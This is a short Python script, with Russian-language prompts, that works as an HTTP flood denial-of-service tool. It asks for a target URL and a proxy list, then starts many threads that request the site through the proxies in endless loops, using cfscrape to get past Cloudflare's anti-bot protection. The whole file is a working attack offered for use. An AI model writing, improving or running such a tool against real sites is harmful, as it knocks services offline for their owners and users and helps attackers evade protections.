import cfscrape
from threading import Thread

def attack(proxy, scraper):
    while True:
        try:
            proxies = {"http": f'http://{proxy}', "https": f'http://{proxy}'}
            scraper.get(site, proxies=proxies)
        except:
            pass

if "__main__" == __name__:
    site = input('Введите URL для атаки: ')
    with open(input('Введите название файла с прокси: '), 'r', encoding='utf-8') as file:
        proxy_base = file.readlines()
    colprox = int(input(f'Сколько прокси использовать из {len(proxy_base)}: '))

    scraper = cfscrape.create_scraper()
    for x in range(colprox+1):
        Thread(target=attack, args=(proxy_base[x],scraper,)).start()
        print(f'\r\rStarted thread {x}/{len(proxy_base)}', end='')